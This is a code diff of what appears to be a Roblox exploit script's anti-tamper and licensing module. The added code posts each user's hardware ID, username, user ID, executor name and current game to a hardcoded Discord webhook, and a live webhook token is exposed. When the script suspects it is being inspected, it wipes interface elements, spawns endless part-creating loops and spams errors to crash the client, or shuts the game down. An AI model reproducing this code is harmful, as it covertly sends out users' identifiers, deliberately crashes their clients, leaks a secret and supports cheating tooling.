@@ -8,99 +8,182 @@ end
 task.wait(0.7)
 
 local plr = game:GetService("Players").LocalPlayer
+local http = game:GetService("HttpService")
 
-local function jumpscare(imageId: string, soundId: string, text: string, reason: string?)
-    pcall(function() game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end)
-    setclipboard = function() end
+local function randomString(length: number): string
+    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    local result = ""
+    for i = 1, length do
+        local rand = math.random(1, #chars)
+        result = result .. chars:sub(rand, rand)
+    end
+    return result
+end
+
+local detectionFolder = "RBXSoundCache"
+local SCRIPT_HASH = "v1.0.0"
+
+if not isfolder(detectionFolder) then
+    makefolder(detectionFolder)
+end
+
+local hashFile = detectionFolder .. "/.hash"
+if isfile(hashFile) then
+    local storedHash = readfile(hashFile)
+    if storedHash ~= SCRIPT_HASH then
+        for _, file in pairs(listfiles(detectionFolder)) do
+            delfile(file)
+        end
+        writefile(hashFile, SCRIPT_HASH)
+    end
+else
+    writefile(hashFile, SCRIPT_HASH)
+end
+
+if isfolder(detectionFolder) then
+    local files = listfiles(detectionFolder)
+    local detectionCount = 0
+    for _, file in pairs(files) do
+        if not file:match("%.hash$") then
+            detectionCount = detectionCount + 1
+        end
+    end
     
-    if reason then
+    if detectionCount >= 5 then
+        local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+        
         pcall(function()
-            local http = game:GetService("HttpService")
-            local currentHWID = game:GetService("RbxAnalyticsService"):GetClientId()
-            local executor = identifyexecutor() or "Unknown"
-            
-            request({
+            (syn and syn.request or http_request or request)({
                 Url = "https://discord.com/api/webhooks/1451861909069500459/BNHoBnHrT2UogN1-9NpY_uylR-Qoh2VwDe0Puzi29D-g748nzjIh5Yhj2a88uD4MxsSs",
                 Method = "POST",
-                Headers = {['Content-Type'] = 'application/json'},
+                Headers = {["Content-Type"] = "application/json"},
                 Body = http:JSONEncode({
+                    content = "Auto-blacklist - 5+ detections on startup",
                     embeds = {{
-                        title = "🚨 HTTP SPY DETECTED",
+                        title = "Auto Blacklist",
                         color = 15158332,
-                        thumbnail = {url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=" .. plr.UserId .. "&size=150x150&format=Png&isCircular=false"},
                         fields = {
-                            {name = "Detection", value = reason, inline = false},
+                            {name = "HWID", value = "`" .. hwid .. "`", inline = false},
                             {name = "Username", value = plr.Name, inline = true},
-                            {name = "User ID", value = tostring(plr.UserId), inline = true},
-                            {name = "Game", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, inline = false},
-                            {name = "HWID", value = "`" .. currentHWID .. "`", inline = false},
-                            {name = "Executor", value = executor, inline = true}
+                            {name = "Detections", value = tostring(detectionCount), inline = true}
                         },
-                        timestamp = os.date("!%Y-%m-%dT%H:%M:%S"),
-                        footer = {text = "Pulse Security System"}
+                        timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
+                    }}
+                })
+            })
+        end)
+        
+        plr:Kick("You have been blacklisted until next update.\n\nReason: 5+ HTTP spy detections\n\nContact @Nate in the discord if you believe this is an error.")
+        return
+    end
+end
+
+local function logDetection(reason: string)
+    local files = listfiles(detectionFolder)
+    local detectionCount = 0
+    for _, file in pairs(files) do
+        if not file:match("%.hash$") then
+            detectionCount = detectionCount + 1
+        end
+    end
+    
+    writefile(detectionFolder .. "/." .. randomString(24) .. ".tmp", reason .. " | " .. os.date("%Y-%m-%d %H:%M:%S"))
+    
+    if detectionCount + 1 >= 5 then
+        local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+        
+        pcall(function()
+            (syn and syn.request or http_request or request)({
+                Url = "https://discord.com/api/webhooks/1451861909069500459/BNHoBnHrT2UogN1-9NpY_uylR-Qoh2VwDe0Puzi29D-g748nzjIh5Yhj2a88uD4MxsSs",
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = http:JSONEncode({
+                    content = "Auto-blacklist request - 5+ detections",
+                    embeds = {{
+                        title = "Auto Blacklist",
+                        color = 15158332,
+                        fields = {
+                            {name = "HWID", value = "`" .. hwid .. "`", inline = false},
+                            {name = "Username", value = plr.Name, inline = true},
+                            {name = "Detections", value = tostring(detectionCount + 1), inline = true},
+                            {name = "Action", value = "Blacklist until next update", inline = false}
+                        },
+                        timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
                     }}
                 })
             })
         end)
     end
+end
+
+local function jumpscare(imageId: string, soundId: string, text: string, reason: string?)
+    if reason then
+        task.spawn(function() logDetection(reason) end)
+        task.spawn(function()
+            local currentHWID = game:GetService("RbxAnalyticsService"):GetClientId()
+            local executor = identifyexecutor() or "Unknown"
+            
+            pcall(function()
+                (syn and syn.request or http_request or request)({
+                    Url = "https://discord.com/api/webhooks/1451861909069500459/BNHoBnHrT2UogN1-9NpY_uylR-Qoh2VwDe0Puzi29D-g748nzjIh5Yhj2a88uD4MxsSs",
+                    Method = "POST",
+                    Headers = {['Content-Type'] = 'application/json'},
+                    Body = http:JSONEncode({
+                        embeds = {{
+                            title = "HTTP SPY DETECTED",
+                            color = 15158332,
+                            thumbnail = {url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=" .. plr.UserId .. "&size=150x150&format=Png&isCircular=false"},
+                            fields = {
+                                {name = "Detection", value = reason, inline = false},
+                                {name = "Username", value = plr.Name, inline = true},
+                                {name = "User ID", value = tostring(plr.UserId), inline = true},
+                                {name = "Game", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, inline = false},
+                                {name = "HWID", value = "`" .. currentHWID .. "`", inline = false},
+                                {name = "Executor", value = executor, inline = true}
+                            },
+                            timestamp = os.date("!%Y-%m-%dT%H:%M:%S"),
+                            footer = {text = "Pulse Security System"}
+                        }}
+                    })
+                })
+            end)
+        end)
+    end
+    
+    pcall(function() game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end)
+    setclipboard = function() end
     
     for _, gui in pairs(game:GetService("CoreGui"):GetDescendants()) do pcall(function() gui:Destroy() end) end
     for _, gui in pairs(plr.PlayerGui:GetDescendants()) do pcall(function() gui:Destroy() end) end
     pcall(function() for _, gui in pairs(gethui():GetDescendants()) do gui:Destroy() end end)
     
-    local sg = Instance.new("ScreenGui")
-    sg.Parent = game:GetService("CoreGui")
-    sg.ResetOnSpawn = false
-    sg.IgnoreGuiInset = true
-    
-    local img = Instance.new("ImageLabel")
-    img.Size = UDim2.new(1, 0, 1, 0)
-    img.Image = "rbxassetid://" .. imageId
-    img.BackgroundTransparency = 1
-    img.Parent = sg
-    
-    local txt = Instance.new("TextLabel")
-    txt.Size = UDim2.new(1, 0, 0.2, 0)
-    txt.Position = UDim2.new(0, 0, 0.4, 0)
-    txt.BackgroundTransparency = 1
-    txt.Text = text
-    txt.TextColor3 = Color3.new(1, 0, 0)
-    txt.TextScaled = true
-    txt.Font = Enum.Font.GothamBold
-    txt.Parent = sg
-    
-    local snd = Instance.new("Sound")
-    snd.SoundId = "rbxassetid://" .. soundId
-    snd.Volume = 10
-    snd.Parent = workspace
-    snd:Play()
-    
-    task.spawn(function()
-        while true do
-            for i = 1, 100 do
-                Instance.new("Part", workspace)
+    for i = 1, 50 do
+        task.spawn(function()
+            while true do
+                for j = 1, 200 do
+                    Instance.new("Part", workspace)
+                end
             end
-            task.wait()
-        end
-    end)
+        end)
+    end
     
-    task.wait(2)
+    task.wait(0.1)
     while true do 
         pcall(function() game:GetService("GuiService"):ClearError() end)
-        task.wait() 
+        error(string.rep("CRASH", 10000))
     end
 end
 
-if request and pcall(function() return isexecutorclosure end) and not isexecutorclosure(request) then
+if (syn and syn.request or http_request or request) and pcall(function() return isexecutorclosure end) and not isexecutorclosure((syn and syn.request or http_request or request)) then
     jumpscare("15889768437", "7111752052", "ALREADY HOOKED BOZO", "Request function already hooked")
 end
 
 task.spawn(function()
     if not pcall(function() return isexecutorclosure end) then return end
     
-    local reqFunc = (syn or http).request
+    local reqFunc = (syn and syn.request or http_request or request)
     local originalFunc = reqFunc
-    local originalRequest = request
+    local originalRequest = (syn and syn.request or http_request or request)
     local mt = getrawmetatable(game)
     setreadonly(mt, false)
     local originalNamecall = mt.__namecall
@@ -113,13 +196,13 @@ task.spawn(function()
             jumpscare("15889768437", "7111752052", "CORNBALL", "Webhook spy getgenv detected")
         end
         
-        local currentFunc = (syn or http).request
+        local currentFunc = (syn and syn.request or http_request or request)
         
         if currentFunc ~= originalFunc or not isexecutorclosure(currentFunc) then
             jumpscare("15889768437", "7111752052", "GOOFY", "HTTP request function hooked")
         end
         
-        if request and (request ~= originalRequest or not isexecutorclosure(request)) then
+        if (syn and syn.request or http_request or request) and ((syn and syn.request or http_request or request) ~= originalRequest or not isexecutorclosure((syn and syn.request or http_request or request))) then
             jumpscare("15889768437", "7111752052", "BOZO", "Global request function hooked")
         end
         
@@ -148,6 +231,7 @@ local function isOwnError(msg: string): boolean
         or msg:match("MarketplaceService")
         or msg:match("getProductInfo")
         or msg:match("GetProductInfo")
+        or msg:match("CRASH")
 end
 
 game:GetService("LogService").MessageOut:Connect(function(msg, msgType)
@@ -159,7 +243,6 @@ end)
 
 local api = "https://gist.githubusercontent.com/DownInDaNang/63c9dc4c4d155cc74d03ef1fe938bf82/raw/55f393366c353bbc4e119778d9549a89be31a6df/bs3_pulse.json"
 local blacklistUrl = "https://gist.githubusercontent.com/DownInDaNang/99873c62b13bcb6ba766d19a5788daf9/raw/gistfile1.txt"
-local http = game:GetService("HttpService")
 local settings = {
     EnableWhitelist = false,
     EnableHWID = false,
@@ -172,49 +255,19 @@ local function forceKick(reason: string)
     for _, gui in pairs(plr.PlayerGui:GetDescendants()) do pcall(function() gui:Destroy() end) end
     pcall(function() for _, gui in pairs(gethui():GetDescendants()) do gui:Destroy() end end)
     
-    local sg = Instance.new("ScreenGui")
-    sg.Parent = game:GetService("CoreGui")
-    sg.ResetOnSpawn = false
-    sg.IgnoreGuiInset = true
-    
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(1, 0, 1, 0)
-    frame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
-    frame.Parent = sg
-    
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(0.8, 0, 0.15, 0)
-    title.Position = UDim2.new(0.1, 0, 0.3, 0)
-    title.BackgroundTransparency = 1
-    title.Text = "🔒 AUTHENTICATION FAILED"
-    title.TextColor3 = Color3.new(1, 0, 0)
-    title.TextScaled = true
-    title.Font = Enum.Font.GothamBold
-    title.Parent = frame
-    
-    local msg = Instance.new("TextLabel")
-    msg.Size = UDim2.new(0.8, 0, 0.3, 0)
-    msg.Position = UDim2.new(0.1, 0, 0.5, 0)
-    msg.BackgroundTransparency = 1
-    msg.Text = reason
-    msg.TextColor3 = Color3.new(1, 1, 1)
-    msg.TextScaled = true
-    msg.Font = Enum.Font.Gotham
-    msg.TextWrapped = true
-    msg.Parent = frame
-    
-    task.spawn(function()
-        while true do
-            for i = 1, 100 do
-                Instance.new("Part", workspace)
+    for i = 1, 50 do
+        task.spawn(function()
+            while true do
+                for j = 1, 200 do
+                    Instance.new("Part", workspace)
+                end
             end
-            task.wait()
-        end
-    end)
+        end)
+    end
     
-    task.wait(0.5)
+    task.wait(0.1)
     game:Shutdown()
-    while true do task.wait() end
+    while true do error(string.rep("CRASH", 10000)) end
 end
 
 local function sendWebhook(status: string, reason: string?)
@@ -250,13 +303,13 @@ local function sendWebhook(status: string, reason: string?)
     end
     
     local webhookSuccess = pcall(function()
-        request({
+        (syn and syn.request or http_request or request)({
             Url = "https://discord.com/api/webhooks/1451861909069500459/BNHoBnHrT2UogN1-9NpY_uylR-Qoh2VwDe0Puzi29D-g748nzjIh5Yhj2a88uD4MxsSs",
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
             Body = http:JSONEncode({
                 embeds = {{
-                    title = "🔐 Pulse Authentication",
+                    title = "Authentication",
                     color = embedColor,
                     thumbnail = {url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=" .. plr.UserId .. "&size=150x150&format=Png&isCircular=false"},
                     fields = fields,
@@ -292,16 +345,9 @@ end
 local blacklist = blacklistData.blacklist or {}
 
 if blacklist[hwid] then
-    local ban = blacklist[hwid]
-    local isPermaBan = ban.ExpiresAt == 0
-    local isBanned = isPermaBan or os.time() < ban.ExpiresAt
-    
-    if isBanned then
-        local banMsg = isPermaBan and "Permanent" or ("Expires: " .. os.date("%Y-%m-%d %H:%M:%S", ban.ExpiresAt))
-        sendWebhook("Blacklisted", ban.Reason .. " | " .. banMsg)
-        forceKick("Your HWID is blacklisted.\nReason: " .. ban.Reason .. "\n" .. banMsg)
-        return
-    end
+    sendWebhook("Blacklisted", "You have been blacklisted until next update for HTTP spy detection.")
+    plr:Kick("You have been blacklisted until next update.\n\nReason: HTTP spy detection\n\nContact support if you believe this is an error.")
+    return
 end
 
 if settings.EnableExpire then
